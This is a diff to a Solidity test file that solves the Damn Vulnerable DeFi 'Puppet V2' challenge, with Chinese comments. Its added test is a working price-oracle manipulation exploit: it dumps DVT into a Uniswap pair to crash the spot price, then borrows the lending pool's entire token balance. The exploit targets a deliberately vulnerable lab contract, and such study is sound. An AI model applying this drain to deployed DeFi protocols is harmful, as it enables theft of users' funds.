@@ -80,13 +80,14 @@ contract PuppetV2 is Test {
             deployer, // to
             DEADLINE // deadline
         );
+        // 也就是说在该池子中每个dvt初始价格是0.1 ether
 
         // Get a reference to the created Uniswap pair
         uniswapV2Pair = IUniswapV2Pair(
             uniswapV2Factory.getPair(address(dvt), address(weth))
         );
 
-        assertGt(uniswapV2Pair.balanceOf(deployer), 0);
+        assertGt(uniswapV2Pair.balanceOf(deployer), 0); // 初始流动性,(amount of tokenA * amount of  tokenB)^0.5
 
         // Deploy the lending pool
         puppetV2Pool = new PuppetV2Pool(
@@ -105,6 +106,8 @@ contract PuppetV2 is Test {
             puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
             0.3 ether
         );
+        // 1个dvt等价于0.1 ether, 但是需要存3倍的eth
+        // 因此应该存储0.3 ether的eth
 
         assertEq(
             puppetV2Pool.calculateDepositOfWETHRequired(
@@ -116,9 +119,51 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    // 这仍然是一个操纵预言机的攻击, 原因是puppet合约并未正确使用v2提供的时间加权预言机
+    // 向uniswap池中倾销dvt, 拉低价格, 然后用一部分eth向puppet池借贷出更多的dvt,然后继续向uniswap池倾销这些dvt继续拉低价格
+    // 然后用ETH继续借贷dvt并倾销. 重复上述过程即可掏空池子
+    function testExploitPUPPET2() public {
         /** EXPLOIT START **/
+        // weth dvt
+        uint256 _a=dvt.balanceOf(attacker);
+        console.log("before swap attacker has dvt:",_a/1e18);
+        console.log("before swap attacker has ether:",attacker.balance/1e18);
+        console.log("befor swap attacker has weth:",weth.balanceOf(attacker)/1e18);
+        
+        address[] memory path=new address[](2);
+        path[0]=address(dvt);
+        path[1]=address(weth);
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router),ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+        uniswapV2Router.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0 ether,
+            path,
+            attacker,
+            DEADLINE
+        );
+        vm.stopPrank();
 
+        uint256 _b=dvt.balanceOf(attacker);
+        console.log("after swap attacker has dvt:",_b/1e18);
+        console.log("after swap attacker has ether:",attacker.balance/1e18);
+        console.log("after swap attacker has weth:",weth.balanceOf(attacker)/1e18);
+        
+
+        // 检查掏空puppet2需要多少weth
+        uint256 wethNeeded = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)/1e18;
+        console.log("empty ppt2 need weth: ",wethNeeded);
+
+        vm.startPrank(attacker);
+        // eth换成weth
+        weth.deposit{value:attacker.balance}();
+        console.log("weth of attacker",weth.balanceOf(attacker)/1e18);
+
+        weth.approve(address(puppetV2Pool),POOL_INITIAL_TOKEN_BALANCE);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+        
         /** EXPLOIT END **/
         validation();
     }
